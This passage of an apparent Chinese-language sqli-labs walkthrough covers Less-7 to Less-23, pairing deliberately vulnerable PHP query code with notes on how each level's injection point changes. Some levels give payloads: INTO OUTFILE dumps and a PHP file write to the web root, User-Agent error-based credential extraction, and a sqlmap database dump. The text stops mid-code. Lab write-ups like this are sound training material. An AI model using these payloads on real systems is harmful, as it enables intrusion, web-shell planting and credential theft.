class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mysql -e <span class=\"string\">\"show global variables like '%secure%';\"</span></span><br><span class=\"line\">+------------------+-------+</span><br><span class=\"line\">| Variable_name    | Value |</span><br><span class=\"line\">+------------------+-------+</span><br><span class=\"line\">| secure_auth      | OFF   |</span><br><span class=\"line\">| secure_file_priv |       |</span><br><span class=\"line\">+------------------+-------+</span><br></pre></td></tr></tbody></table></figure>\n\n<p>当<code>secure_file_priv</code>为<code>null</code>时，表示限制<code>mysql</code>不允许导入导出。</p>\n<p>当<code>secure_file_priv</code>为<code>/tmp</code>时，表示限制<code>mysql</code>只能在<code>/tmp</code>目录下导入导出。</p>\n<p>当<code>secure_file_priv</code>为<code>空</code>时，表示限制<code>mysql</code>不对导入导出做限制。</p>\n<p>这里还需要赋予文件写入的权限</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">chmod</span> -R 777 /var/www/html</span><br></pre></td></tr></tbody></table></figure>\n\n<p>然后执行sql语句</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'))union select * from security.users into outfile \"/var/www/html/Less-7/user.txt\"%23</span></span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/31899/image-20250310220651812.png\" class=\"\" title=\"image-20250310220651812\">\n\n<p>这里也可以写入shell</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'))union select 1,2,\"&lt;?php phpinfo();?&gt;\" into outfile \"/var/www/html/Less-7/info.php\"%23</span></span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/31899/image-20250310220934038.png\" class=\"\" title=\"image-20250310220934038\">\n\n<h4 id=\"3-2-8-Less-8\"><a href=\"#3-2-8-Less-8\" class=\"headerlink\" title=\"3.2.8 Less-8\"></a>3.2.8 Less-8</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in....'</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"comment\">//print_r(mysql_error());</span></span><br><span class=\"line\">    <span class=\"comment\">//echo \"You have an error in your SQL syntax\";</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-9-Less-9\"><a href=\"#3-2-9-Less-9\" class=\"headerlink\" title=\"3.2.9 Less-9\"></a>3.2.9 Less-9</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in....'</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in....'</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>只能用延时注入。</p>\n<h4 id=\"3-2-10-Less-10\"><a href=\"#3-2-10-Less-10\" class=\"headerlink\" title=\"3.2.10 Less-10\"></a>3.2.10 Less-10</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id=<span class=\"subst\">$id</span> LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in....'</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">'You are in....'</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-11-Less-11\"><a href=\"#3-2-11-Less-11\" class=\"headerlink\" title=\"3.2.11 Less-11\"></a>3.2.11 Less-11</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT username, password FROM users WHERE username='<span class=\"subst\">$uname</span>' and password='<span class=\"subst\">$passwd</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"string\">\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p>与Less-1一致。</p>\n<h4 id=\"3-2-12-Less-12\"><a href=\"#3-2-12-Less-12\" class=\"headerlink\" title=\"3.2.12 Less-12\"></a>3.2.12 Less-12</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT username, password FROM users WHERE username=(<span class=\"subst\">$uname</span>) and password=(<span class=\"subst\">$passwd</span>) LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"string\">\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-13-Less-13\"><a href=\"#3-2-13-Less-13\" class=\"headerlink\" title=\"3.2.13 Less-13\"></a>3.2.13 Less-13</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT username, password FROM users WHERE username=('<span class=\"subst\">$uname</span>') and password=('<span class=\"subst\">$passwd</span>') LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"comment\">//\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());\t</span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变，不能用联合查询。</p>\n<h4 id=\"3-2-14-Less-14\"><a href=\"#3-2-14-Less-14\" class=\"headerlink\" title=\"3.2.14 Less-14\"></a>3.2.14 Less-14</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT username, password FROM users WHERE username=<span class=\"subst\">$uname</span> and password=<span class=\"subst\">$passwd</span> LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"comment\">//\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-15-Less-15\"><a href=\"#3-2-15-Less-15\" class=\"headerlink\" title=\"3.2.15 Less-15\"></a>3.2.15 Less-15</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT username, password FROM users WHERE username='<span class=\"subst\">$uname</span>' and password='<span class=\"subst\">$passwd</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"comment\">//\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"comment\">//print_r(mysql_error());</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变，不能使用报错。</p>\n<h4 id=\"3-2-16-Less-16\"><a href=\"#3-2-16-Less-16\" class=\"headerlink\" title=\"3.2.16 Less-16\"></a>3.2.16 Less-16</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT username, password FROM users WHERE username=(<span class=\"subst\">$uname</span>) and password=(<span class=\"subst\">$passwd</span>) LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"comment\">//\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"comment\">//print_r(mysql_error());</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合类型改变。</p>\n<h4 id=\"3-2-17-Less-17\"><a href=\"#3-2-17-Less-17\" class=\"headerlink\" title=\"3.2.17 Less-17\"></a>3.2.17 Less-17</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//过滤</span></span><br><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>]);</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT username, password FROM users WHERE username= <span class=\"subst\">$uname</span> LIMIT 0,1\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"variable\">$update</span>=<span class=\"string\">\"UPDATE users SET password = '<span class=\"subst\">$passwd</span>' WHERE username='<span class=\"subst\">$row1</span>'\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> error</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>uname</code>被过滤了，只能考虑update这里注入，使用报错注入即可。</p>\n<h4 id=\"3-2-18-Less-18\"><a href=\"#3-2-18-Less-18\" class=\"headerlink\" title=\"3.2.18 Less-18\"></a>3.2.18 Less-18</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uagent</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">'HTTP_USER_AGENT'</span>];</span><br><span class=\"line\"><span class=\"variable\">$IP</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">'REMOTE_ADDR'</span>];</span><br><span class=\"line\"><span class=\"comment\">//uname和passwd被过滤</span></span><br><span class=\"line\"><span class=\"variable\">$uname</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>]);</span><br><span class=\"line\"><span class=\"variable\">$passwd</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT  users.username, users.password FROM users WHERE users.username=<span class=\"subst\">$uname</span> and users.password=<span class=\"subst\">$passwd</span> ORDER BY users.id DESC LIMIT 0,1\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"variable\">$insert</span>=<span class=\"string\">\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class=\"subst\">$uagent</span>', '<span class=\"subst\">$IP</span>', <span class=\"subst\">$uname</span>)\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">'Your User Agent is: '</span> .<span class=\"variable\">$uagent</span>;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());\t</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这里<code>uname</code>和<code>passwd</code>被过滤了，因此只能在insert语句注入。</p>\n<ul>\n<li><code>$_SERVER['HTTP_CLIENT_IP']</code> 客户端可以伪造。</li>\n<li><code>$_SERVER['HTTP_X_FORWARDED_FOR']</code>，客户端可以伪造。</li>\n<li><code>$_SERVER['REMOTE_ADDR']</code>，客户端不能伪造。</li>\n</ul>\n<p>所以这里只能在<code>User-Agent</code>注入。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">User</span><span class=\"operator\">-</span>Agent: <span class=\"number\">1</span><span class=\"string\">'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span><span class=\"number\">1</span><span class=\"string\">'='</span><span class=\"number\">1</span></span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/31899/image-20250310224830354.png\" class=\"\" title=\"image-20250310224830354\">\n\n<h4 id=\"3-2-19-Less-19\"><a href=\"#3-2-19-Less-19\" class=\"headerlink\" title=\"3.2.19 Less-19\"></a>3.2.19 Less-19</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uagent</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">'HTTP_REFERER'</span>];</span><br><span class=\"line\"><span class=\"variable\">$IP</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">'REMOTE_ADDR'</span>];</span><br><span class=\"line\"><span class=\"comment\">//uname和passwd被过滤</span></span><br><span class=\"line\"><span class=\"variable\">$uname</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>]);</span><br><span class=\"line\"><span class=\"variable\">$passwd</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT  users.username, users.password FROM users WHERE users.username=<span class=\"subst\">$uname</span> and users.password=<span class=\"subst\">$passwd</span> ORDER BY users.id DESC LIMIT 0,1\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"variable\">$insert</span>=<span class=\"string\">\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('<span class=\"subst\">$uagent</span>', '<span class=\"subst\">$IP</span>')\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">'Your Referer is: '</span> .<span class=\"variable\">$uagent</span>;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());\t</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>User-Agent</code>改为了<code>Referer</code>。</p>\n<h4 id=\"3-2-20-Less-20\"><a href=\"#3-2-20-Less-20\" class=\"headerlink\" title=\"3.2.20 Less-20\"></a>3.2.20 Less-20</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">'uname'</span>]))</span><br><span class=\"line\">    <span class=\"comment\">//过滤uname和passwd</span></span><br><span class=\"line\">    <span class=\"variable\">$uname</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'uname'</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$passwd</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'passwd'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT  users.username, users.password FROM users WHERE users.username=<span class=\"subst\">$uname</span> and users.password=<span class=\"subst\">$passwd</span> ORDER BY users.id DESC LIMIT 0,1\"</span>;</span><br><span class=\"line\">    <span class=\"variable\">$cookee</span> = <span class=\"variable\">$row1</span>[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">'uname'</span>, <span class=\"variable\">$cookee</span>, <span class=\"title function_ invoke__\">time</span>()+<span class=\"number\">3600</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'submit'</span>]))</span><br><span class=\"line\">        <span class=\"variable\">$cookee</span> = <span class=\"variable\">$_COOKIE</span>[<span class=\"string\">'uname'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE username='<span class=\"subst\">$cookee</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"variable\">$result</span>)</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$row</span>)</span><br><span class=\"line\">            <span class=\"string\">\"输出查询的信息\"</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">'uname'</span>, <span class=\"variable\">$row1</span>[<span class=\"string\">'username'</span>], <span class=\"title function_ invoke__\">time</span>()-<span class=\"number\">3600</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>就是从<code>Cookie</code>中读取<code>uname</code>值，产生注入。</p>\n<h3 id=\"3-3-Less21-37\"><a href=\"#3-3-Less21-37\" class=\"headerlink\" title=\"3.3 Less21-37\"></a>3.3 Less21-37</h3><h4 id=\"3-3-1-Less-21\"><a href=\"#3-3-1-Less-21\" class=\"headerlink\" title=\"3.3.1 Less-21\"></a>3.3.1 Less-21</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$cookee</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$cookee</span>);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE username=('<span class=\"subst\">$cookee</span>') LIMIT 0,1\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>只节选了相关代码，其余与<code>Less-20</code>大差不差，主要是多了一个base64编码，这里可以用sqlmap脚本。</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u http://127.0.0.1:8888/Less-21/ --cookie=<span class=\"string\">\"uname=*\"</span> --tamper=<span class=\"string\">\"base64encode\"</span> -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/31899/image-20250310230842396.png\" class=\"\" title=\"image-20250310230842396\">\n\n<h4 id=\"3-3-2-Less-22\"><a href=\"#3-3-2-Less-22\" class=\"headerlink\" title=\"3.3.2 Less-22\"></a>3.3.2 Less-22</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$cookee1</span> = <span class=\"string\">'\"'</span>. <span class=\"variable\">$cookee</span>. <span class=\"string\">'\"'</span>;    </span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE username=<span class=\"subst\">$cookee1</span> LIMIT 0,1\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>闭合方式改变</p>\n<h4 id=\"3-3-3-Less-23\"><a href=\"#3-3-3-Less-23\" class=\"headerlink\" title=\"3.3.3 Less-23\"></a>3.3.3 Less-23</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">'id'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$reg</span> = <span class=\"string\">\"/#/\"</span>;</span><br><span class=\"line\"><span class=\"variable\">$reg1</span> = <span class=\"string\">\"/--/\"</span>;</span><br><span class=\"line\"><span class=\"variable\">$replace</span> = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$reg</span>, <span class=\"variable\">$replace</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$reg1</span>, <span class=\"variable\">$replace</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"string\">\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"title function_ 